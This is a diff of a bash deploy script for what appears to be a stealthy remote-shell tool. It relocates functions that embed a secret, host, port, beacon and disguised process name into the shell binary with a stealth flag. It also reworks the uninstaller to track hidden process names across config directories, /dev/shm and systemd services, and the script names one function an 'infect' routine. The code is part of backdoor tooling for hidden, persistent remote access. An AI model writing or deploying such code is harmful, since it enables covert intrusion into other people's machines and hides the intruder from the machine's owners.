@@ -980,6 +980,58 @@ init_setup()
 	DEBUGF "DSTBIN=${DSTBIN}"
 }
 
+# Execute 'src' to create configuration and add it to 'dst'.
+# config2bin src dst ARGS
+# 'src' must be executeable.
+config2bin() {
+	local src="$1"
+	local dst="$2"
+	local opts="$3"
+	local proc_hidden_name="$4"
+	local dst_final
+
+	[[ "$src" == "$dst" ]] && {
+		# Identical => make temporary copy first (because we can not append
+		# data to a binary that is currently being executed/loaded)
+		dst_final="${dst}"
+		dst="${src}.tmp"
+		_ts_add_pdir "${dst_final}"
+	}
+
+	[[ ! -f "${dst}" ]] && {
+		_ts_add_pdir "${dst}"
+		cp -p "${src}" "${dst}" || return 255
+	}
+
+	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	[[ -n "$dst_final" ]] && {
+		cat "${dst}" >"${dst_final}"
+		rm -f "${dst:?}"
+	}
+
+	return 0
+}
+
+# Load configuration from TARGET by executing EXE.
+# exe target
+bin2config() {
+	local exe="$1"
+	local bin="$2"
+
+	unset GS_CONFIG_SECRET
+	unset GS_CONFIG_PROC_HIDDENNAME
+	unset GS_CONFIG_NOT_FOUND
+	unset GS_CONFIG_BEACON
+	unset GS_CONFIG_HOST
+	unset GS_CONFIG_PORT
+	[[ ! -f "${exe}" ]] && return 255
+	[[ ! -f "${bin}" ]] && return 255
+
+	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
+	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
+	return 0
+}
+
 uninstall_rm()
 {
 	[[ -z "$1" ]] && return
@@ -987,6 +1039,11 @@ uninstall_rm()
 
 	echo "Removing $1..."
 	xrm "$1" 2>/dev/null
+}
+
+uninstall_bin_rm() {
+	bin2config "$1" "$1" && [[ -n "$GS_CONFIG_PROC_HIDDENNAME" ]] && UNINST_PROC_HN_ARR+=("$GS_CONFIG_PROC_HIDDENNAME")
+	uninstall_rm "$@"
 }
 
 uninstall_rmdir()
@@ -1040,6 +1097,12 @@ uninstall_service()
 		systemctl disable "${sn}" 2>/dev/null && systemd_kill_cmd+="systemctl stop ${sn};"
 	}
 
+	if grep -Fqm1 oneshot "${sf}" 2>/dev/null; then
+		UNINST_IS_SYSTEMD_ONESHOT=1
+	else
+		UNINST_IS_SYSTEMD_SIMPLE=1
+	fi
+
 	uninstall_rm "${sf}"
 }
 
@@ -1070,14 +1133,14 @@ uninstall()
 	cmd_kill_arr=("${BIN_HIDDEN_NAME}")
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
-			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
+			uninstall_bin_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
 			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
 		done
-		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"  # obsolete
-		uninstall_rm "${GS_PREFIX}/usr/sbin/${hn}"
-		uninstall_rm "/dev/shm/${hn}"
-		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
-		uninstall_rm "${PWD}/${hn}"
+		uninstall_bin_rm "${GS_PREFIX}/usr/bin/${hn}"  # obsolete
+		uninstall_bin_rm "${GS_PREFIX}/usr/sbin/${hn}"
+		uninstall_bin_rm "/dev/shm/${hn}"
+		uninstall_bin_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_bin_rm "${PWD}/${hn}"
 
 		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
 		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
@@ -1132,17 +1195,20 @@ uninstall()
 
 	echo -e "${CG}Uninstall complete.${CN}"
 
-	[[ -n "$systemd_kill_cmd" ]] && systemctl daemon-reload 2>/dev/null
+	[[ -n "$systemd_kill_cmd" ]] && {
+		systemctl daemon-reload 2>/dev/null
+		[[ -n "$UNINST_IS_SYSTEMD_SIMPLE" ]] && echo -e "--> Use ${CM}${systemd_kill_cmd}${CN} to terminate all running shells."
+	}
 
-	echo -en "--> Use ${CM}"
-	if [[ -n $IS_KILL_ON_ARGV0 ]]; then
-		echo -n "pkill -x '(${PROC_HIDDEN_NAME_RX})';"
-	else
-		for x in "${cmd_kill_arr[@]}"; do
-			echo -n "${KL_CMD_TERM:-pkill -x} '$x';"
+	[[ ${#UNINST_PROC_HN_ARR[@]} -gt 0 ]] && {
+		# FIXME: One day check that all these processes are the correct ones:
+		echo -e "--> Verify and manually terminate all running shells:${CM}"
+		for p in "${UNINST_PROC_HN_ARR[@]}"; do
+			echo "    ps -eF f | grep -F '$p' | grep -v 'grep '"
 		done
-	fi
-	echo -e "${systemd_kill_cmd}${CN} to terminate all running shells."
+		echo -en "${CN}"
+	}
+
 	exit_code 0
 }
 
@@ -1213,57 +1279,6 @@ HOWTO_CONNECT_OUT()
 --> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
 }
 
-# Execute 'src' to create configuration and add it to 'dst'.
-# config2bin src dst ARGS
-# 'src' must be executeable.
-config2bin() {
-	local src="$1"
-	local dst="$2"
-	local opts="$3"
-	local proc_hidden_name="$4"
-	local dst_final
-
-	[[ "$src" == "$dst" ]] && {
-		# Identical => make temporary copy first (because we can not append
-		# data to a binary that is currently being executed/loaded)
-		dst_final="${dst}"
-		dst="${src}.tmp"
-		_ts_add_pdir "${dst_final}"
-	}
-
-	[[ ! -f "${dst}" ]] && {
-		_ts_add_pdir "${dst}"
-		cp -p "${src}" "${dst}" || return 255
-	}
-
-	TERM=xterm-256color GS_CCG="${GS_CCG}" GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
-	[[ -n "$dst_final" ]] && {
-		cat "${dst}" >"${dst_final}"
-		rm -f "${dst:?}"
-	}
-
-	return 0
-}
-
-# Load configuration from TARGET by executing EXE.
-# exe target
-bin2config() {
-	local exe="$1"
-	local bin="$2"
-
-	unset GS_CONFIG_SECRET
-	unset GS_CONFIG_PROC_HIDDENNAME
-	unset GS_CONFIG_NOT_FOUND
-	unset GS_CONFIG_BEACON
-	unset GS_CONFIG_HOST
-	unset GS_CONFIG_PORT
-	[[ ! -f "${exe}" ]] && return 255
-	[[ ! -f "${bin}" ]] && return 255
-
-	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
-	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
-	return 0
-}
 
 gs_secret_reload_systemd_infect() {
 	local bin
